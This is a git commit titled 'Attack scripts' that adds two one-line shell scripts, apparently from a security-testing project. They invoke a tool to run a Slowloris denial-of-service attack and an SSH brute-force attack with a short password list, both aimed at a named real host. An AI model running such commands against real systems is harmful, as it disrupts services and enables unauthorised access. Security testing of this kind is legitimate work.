c778695b35bfa976e1a9ee1c5487a975c74df260
Babis Chatzinakis <charalampos.chatzinakis@cea.fr>
2023-07-12 16:40:32 +0200

    Attack scripts

---
+++ slowloris_dos.sh
@@ -0,0 +1,1 @@
+python3.10 src/mmt_attack.py slowloris acas.montimage.com -p 80 -s 100
---
+++ ssh_brute_force.sh
@@ -0,0 +1,1 @@
+python3.8  src/mmt_attack.py ssh-bruteforce-attack acas.montimage.com 22 montimage "password1","password2","123456","Password2023" 
